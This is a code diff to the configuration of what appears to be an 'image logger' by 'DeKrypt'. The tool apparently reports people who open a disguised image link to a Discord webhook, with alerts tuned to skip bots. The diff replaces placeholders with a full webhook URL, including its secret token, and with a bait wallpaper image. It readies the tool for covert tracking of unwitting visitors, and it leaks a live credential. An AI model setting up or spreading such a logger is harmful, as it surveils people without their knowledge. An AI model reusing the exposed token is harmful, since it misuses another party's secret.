@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1334913019792064615/VMhoWEMWOzopOCn-QZux0qsYS2r1voThjsJ0pdzSFNOC5q3kbB4jl-pvY2FqvTaiwEj2",
+    "image": "https://art.thiojoe.com/wallpaper/bliss-neue/Bliss+Neue+-+4K.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -48,7 +48,7 @@ config = {
                 # 4 = Don't send an alert when it's 100% a bot
     
 
-    # REDIRECTION #
+    # REDIRECTION #    
     "redirect": {
         "redirect": False, # Redirect to a webpage?
         "page": "https://your-link.here" # Link to the webpage to redirect to 
